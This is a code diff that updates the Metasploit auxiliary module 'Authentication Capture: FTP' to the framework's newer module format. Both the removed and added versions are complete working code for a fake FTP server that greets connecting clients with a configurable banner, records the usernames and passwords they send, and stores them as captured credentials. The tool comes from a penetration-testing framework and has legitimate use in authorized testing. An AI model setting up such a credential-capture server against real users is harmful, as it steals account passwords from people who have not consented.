@@ -1,105 +1,123 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::TcpServer
+  include Msf::Auxiliary::Report
 
-require 'msf/core'
+  def initialize
+    super(
+      'Name' => 'Authentication Capture: FTP',
+      'Description' => %q{
+          This module provides a fake FTP service that
+        is designed to capture authentication credentials.
+      },
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', { 'Description' => 'Run FTP capture server' } ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
+    )
 
-class Metasploit3 < Msf::Auxiliary
+    register_options(
+      [
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 21 ]),
+        OptString.new('BANNER', [ true, 'The server banner', 'FTP Server Ready'])
+      ]
+    )
+  end
 
-	include Msf::Exploit::Remote::TcpServer
-	include Msf::Auxiliary::Report
+  def setup
+    super
+    @state = {}
+  end
 
-	def initialize
-		super(
-			'Name'        => 'Authentication Capture: FTP',
-			'Version'     => '$Revision$',
-			'Description'    => %q{
-					This module provides a fake FTP service that
-				is designed to capture authentication credentials.
-			},
-			'Author'      => ['ddz', 'hdm'],
-			'License'     => MSF_LICENSE,
-			'Actions'     =>
-				[
-					[ 'Capture' ]
-				],
-			'PassiveActions' =>
-				[
-					'Capture'
-				],
-			'DefaultAction'  => 'Capture'
-		)
+  def run
+    exploit
+  end
 
-		register_options(
-			[
-				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 21 ])
-			], self.class)
-	end
+  def on_client_connect(client)
+    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
+    client.put "220 #{datastore['BANNER']}\r\n"
+  end
 
-	def setup
-		super
-		@state = {}
-	end
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-	def run
-		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-		exploit()
-	end
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
 
-	def on_client_connect(c)
-		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-		c.put "220 FTP Server Ready\r\n"
-	end
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
 
-	def on_client_data(c)
-		data = c.get_once
-		return if not data
-		cmd,arg = data.strip.split(/\s+/, 2)
-		arg ||= ""
+    create_credential_login(login_data)
+  end
 
-		if(cmd.upcase == "USER")
-			@state[c][:user] = arg
-			c.put "331 User name okay, need password...\r\n"
-			return
-		end
+  def on_client_data(client)
+    data = client.get_once
+    return if !data
 
-		if(cmd.upcase == "QUIT")
-			c.put "221 Logout\r\n"
-			return
-		end
+    cmd, arg = data.strip.split(/\s+/, 2)
+    arg ||= ''
 
-		if(cmd.upcase == "PASS")
-			@state[c][:pass] = arg
+    if (cmd.upcase == 'USER')
+      @state[client][:user] = arg
+      client.put "331 User name okay, need password...\r\n"
+      return
+    end
 
-			report_auth_info(
-				:host      => @state[c][:ip],
-				:port => datastore['SRVPORT'],
-				:sname     => 'ftp',
-				:user      => @state[c][:user],
-				:pass      => @state[c][:pass],
-				:source_type => "captured",
-				:active    => true
-			)
+    if (cmd.upcase == 'QUIT')
+      client.put "221 Logout\r\n"
+      return
+    end
 
-			print_status("FTP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
-		end
+    if (cmd.upcase == 'PASS')
+      @state[client][:pass] = arg
 
-		@state[c][:pass] = data.strip
-		c.put "500 Error\r\n"
-		return
+      report_cred(
+        ip: @state[client][:ip],
+        port: datastore['SRVPORT'],
+        service_name: 'ftp',
+        user: @state[client][:user],
+        password: @state[client][:pass],
+        proof: arg
+      )
 
-	end
+      print_good("FTP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
+    end
 
-	def on_client_close(c)
-		@state.delete(c)
-	end
+    @state[client][:pass] = data.strip
+    client.put "500 Error\r\n"
+    return
+  end
 
+  def on_client_close(client)
+    @state.delete(client)
+  end
 
 end
